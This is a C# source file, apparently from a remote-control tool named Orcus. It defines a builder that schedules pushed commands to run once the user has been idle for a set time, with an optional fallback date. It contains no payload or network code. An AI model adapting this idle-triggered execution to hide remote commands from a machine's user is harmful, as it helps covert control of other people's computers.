using System;

namespace Orcus.Shared.DynamicCommands.ExecutionEvents
{
    /// <summary>
    ///     Execute the static command when the user is idle
    /// </summary>
    public class IdleExecutionEventBuilder : IExecutionEventBuilder
    {
        /// <summary>
        ///     The required time in seconds which the user should be idle
        /// </summary>
        public int RequiredIdleTime { get; set; }

        /// <summary>
        ///     Execute the command at a specific <see cref="ExecutionDateTime" /> if the command wasn't executed yet
        /// </summary>
        public bool ExecuteAtDateTimeIfItWasntExecuted { get; set; }

        /// <summary>
        ///     The date and time when the command should be executed. Required <see cref="ExecuteAtDateTimeIfItWasntExecuted" />
        /// </summary>
        public DateTime ExecutionDateTime { get; set; }

        /// <summary>
        ///     The id of <see cref="DateTimeExecutionEventBuilder" /> is 2
        /// </summary>
        public uint Id { get; } = 2;

        /// <summary>
        ///     Get the parameter of this <see cref="ExecutionEvent" />
        /// </summary>
        /// <returns>The parameter of this execution event which provides all neccessary options</returns>
        public byte[] GetParameter()
        {
            var data = new byte[13];
            Array.Copy(BitConverter.GetBytes(RequiredIdleTime), data, 4);
            data[4] = ExecuteAtDateTimeIfItWasntExecuted ? (byte) 1 : (byte) 0;
            if (ExecuteAtDateTimeIfItWasntExecuted)
                Array.Copy(BitConverter.GetBytes(ExecutionDateTime.ToBinary()), 0, data, 5, 8);

            return data;
        }
    }
}